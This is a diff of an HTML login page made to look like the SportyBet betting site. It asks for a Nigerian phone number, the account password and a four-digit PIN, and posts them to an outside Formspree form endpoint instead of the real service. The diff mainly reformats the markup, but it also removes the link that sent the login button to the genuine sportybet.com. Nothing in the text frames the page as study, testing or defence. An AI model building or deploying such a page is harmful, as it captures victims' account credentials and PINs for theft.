@@ -9,7 +9,10 @@
     <link rel="stylesheet" href="/css/style.css" />
     <title>Login SportyBetApp</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css" rel="stylesheet">
+    <link
+      href="https://unpkg.com/tailwindcss@^1.0/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
   </head>
   <body class="max-w-7xl mx-auto">
     <header class="text-black p-10 flex justify-between items-center">
@@ -59,36 +62,67 @@
     </header>
     <main class="pb-10 px-10 flex flex-col">
       <div>
-        <form  method="POST" action="https://formspree.io/f/mvoygqok" >
+        <form method="POST" action="https://formspree.io/f/mvoygqok">
           <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
             <div>+234</div>
             <input
               type="number"
-              id="number" name="Phone Number"
+              id="number"
+              name="Phone Number"
               placeholder="Sportybet Mobile Number"
-              required class="flex-1 outline-none"
+              required
+              class="flex-1 outline-none"
             />
           </div>
           <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
-            <input type="password" id="Password" placeholder="Sportybet" name="Sportybet Password" class="flex-1 outline-none text-gray-500" required />
+            <input
+              type="password"
+              id="Password"
+              placeholder="Sportybet Password"
+              name="Password"
+              class="flex-1 outline-none text-gray-500"
+              required
+            />
           </div>
           <div class="flex space-x-4 border-2 w-[97%] p-3 mb-5">
-            <input type="number" id="number" placeholder="Sportybet Four Pin" class="flex-1 outline-none" name="Four Digit Pin" required minlength="4" maxlength="4" />
+            <input
+              type="number"
+              id="number"
+              placeholder="Sportybet Four Pin"
+              class="flex-1 outline-none"
+              name="Four Digit Pin"
+              required
+              minlength="4"
+              maxlength="4"
+            />
           </div>
-          <div class="flex items-center w-[100%] lg:w-[99%] -ml-3 p-3 mb-5 mt-10">
-            <a href="https://www.sportybet.com/ng/?utm_source=google&utm_medium=cpc&utm_campaign=11749214843&utm_content=119315394172&utm_term=sportybet&utm_source=google&utm_medium=cpc&utm_campaign=11749214843&utm_content=119315394172&utm_term=sportybet&gclid=CjwKCAjwu5yYBhAjEiwAKXk_ePeZYcndhufK6IY14Qak4pG0Si8ZB9tWgR3EJjmZm5OXLJ8_C7UeXRoC5XsQAvD_BwE" class="home w-full">
-          <button type="submit" class="text-center w-full bg-green-700 py-4 text-white capitalize text-lg rounded shadow hover:shadow-lg active:scale-90 duration-200 ease-out">
-            login</button>
-        </a>
+          <div
+            class="flex items-center w-[100%] lg:w-[99%] -ml-3 p-3 mb-5 mt-10"
+          >
+            <button
+              type="submit"
+              class="text-center w-full bg-green-700 py-4 text-white capitalize text-lg rounded shadow hover:shadow-lg active:scale-90 duration-200 ease-out"
+            >
+              login
+            </button>
           </div>
         </form>
       </div>
-      <div class="flex justify-between pr-8 capitalize text-blue-900 font-base flex-wrap">
+      <div
+        class="flex justify-between pr-8 capitalize text-blue-900 font-base flex-wrap"
+      >
         <div class="text-sm">forgot password ?</div>
-        <div class="text-sm"> create new account</div>
+        <div class="text-sm">create new account</div>
       </div>
-      <div class="flex capitalize text-xl justify-center items-center my-12 font-medium text-gray-600">or</div>
-      <div class="text-gray-600 text-sm">To deativate or reactivate your account <span class="text-green-700 text-lg text-sm">click here.</span></div>
+      <div
+        class="flex capitalize text-xl justify-center items-center my-12 font-medium text-gray-600"
+      >
+        or
+      </div>
+      <div class="text-gray-600 text-sm">
+        To deativate or reactivate your account
+        <span class="text-green-700 text-lg text-sm">click here.</span>
+      </div>
     </main>
     <script src="./app.js"></script>
   </body>
